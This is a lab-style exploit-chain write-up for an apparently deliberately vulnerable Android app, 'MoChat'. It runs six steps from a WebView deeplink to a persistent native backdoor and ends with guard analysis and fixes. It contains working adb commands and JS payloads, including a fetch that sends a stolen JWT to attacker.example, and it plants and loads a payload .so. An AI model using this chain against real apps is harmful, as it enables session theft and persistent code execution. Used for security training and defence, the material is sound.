# Chain 03 — WebView RCE to Persistent Backdoor

## Overview

| Field | Value |
|-------|-------|
| **Category** | webview + receiver + provider |
| **Difficulty** | INSANE |
| **Steps** | 6 |
| **Components crossed** | MallH5Activity → NotificationReceiver → MallFileProvider |
| **Modern Android** | Fully exploitable (Android 13-16) |
| **decx shape** | deeplink → JS bridge exec → token theft → root-path plant → broadcast → native load |

## Vulnerable surface

- `MallH5Activity` (exported) — deeplink `mochat://mall/open?page=...`, JS bridge `MoChat` with `exec`/`getToken`
- `MoChat.exec(cmd)` — runs shell commands via `Runtime.exec` under app UID
- `MoChat.getToken()` — returns the in-memory JWT to any loaded URL
- `MallFileProvider` (authority `com.mochat.app.mallfile`) — `root-path` element enables writing to `app_librarian/`
- `NotificationReceiver` (exported) — extras `plantUri` + `plantPath` + `load=true` trigger `chmod` + `System.load`

## Step-by-step exploit

### ① Trigger the mall deeplink

```bash
# page=mall loads an attacker-controlled H5 (or reflect payload via an open redirect).
adb shell am start -a android.intent.action.VIEW \
  -d "mochat://mall/open?page=mall" com.mochat.app
```

### ② JS calls MoChat.exec('id') to confirm code execution

```html
<script>
  // Loaded inside MallH5Activity WebView. exec() returns stdout as a string.
  document.title = MoChat.exec('id');
  // -> "uid=10234(u0_a234) gid=10234 groups=..."
</script>
```

Confirms arbitrary command execution under `com.mochat.app` UID.

### ③ JS calls MoChat.getToken() to steal the JWT

```html
<script>
  // Bridge leaks the session token to the page origin (attacker server).
  fetch('https://attacker.example/collect', { method:'POST', body: MoChat.getToken() });
</script>
```

### ④ Use FileProvider root-path to write libpayload.so to app_librarian/

```bash
# MallFileProvider uses a <root-path name="root" path="."/> grant, which (on the vulnerable
# build) exposes app_librarian. Pipe a native .so into the destination path via openFile().
adb shell content write --uri "content://com.mochat.app.mallfile/root/data/data/com.mochat.app/app_librarian/libpayload.so" < libpayload.so
```

The payload's `JNI_OnLoad` performs the actual malicious work.

### ⑤ Send broadcast to NotificationReceiver with plantUri+plantPath+load=true

```bash
# Receiver reads the planted file, chmods it, and System.load()s it.
adb shell am broadcast -n com.mochat.app/.notify.NotificationReceiver \
  --es plantUri "content://com.mochat.app.mallfile/root/data/data/com.mochat.app/app_librarian/libpayload.so" \
  --es plantPath "/data/data/com.mochat.app/app_librarian/libpayload.so" \
  --ez load true
```

### ⑥ Receiver chmod 444 + System.load → JNI_OnLoad runs attacker code persistently

The receiver does:

```java
Os.chmod(plantPath, 0444);          // read-only satisfies Android 14 W^X for DEX/SO
System.load(plantPath);             // -> JNI_OnLoad executes
```

**logcat confirms**:

```
NotificationReceiver: loaded=/data/data/com.mochat.app/app_librarian/libpayload.so rc=0
libpayload: JNI_OnLoad pid=10234 uid=10234 backdoor online
```

Code now runs inside the app process with persistence across launches (the file stays on disk;
any later `System.load` re-arms it).

## Guard analysis

| Guard | Status |
|-------|--------|
| MallH5Activity URL allowlist | absent (any page= loaded) |
| JS bridge origin check | absent (MoChat callable from any URL) |
| MoChat.exec command scoping | absent (full Runtime.exec) |
| MallFileProvider path grant | overbroad (root-path exposes app_librarian) |
| NotificationReceiver permission | absent (exported, any caller) |
| System.load input validation | absent (loads caller-supplied path) |

## Impact

Remote code execution inside `com.mochat.app` plus a persistent native backdoor. The attacker
steals the JWT via the JS bridge, drops a `.so` that survives reboots/reinstalls of state, and
re-executes on every notification broadcast. Full account impersonation, in-process credential
theft, and stealthy long-term persistence.

## Fix

- Enforce a strict URL allowlist in `MallH5Activity`; reject `page=` values that resolve to
  external hosts.
- Restrict the `MoChat` JS interface to trusted origins (verify `WebView.getUrl()` against an
  allowlist before invoking any bridge method).
- Remove `MoChat.exec` entirely; if shell-out is required, sandbox it to a fixed command set.
- Replace `MallFileProvider`'s `root-path` grant with scoped `files-path` / `cache-path`
  elements; never expose `app_librarian`.
- Make `NotificationReceiver` non-exported or require a signature-level permission.
- Never `System.load` a path derived from caller-controlled extras; validate against a known
  list of bundled libraries.
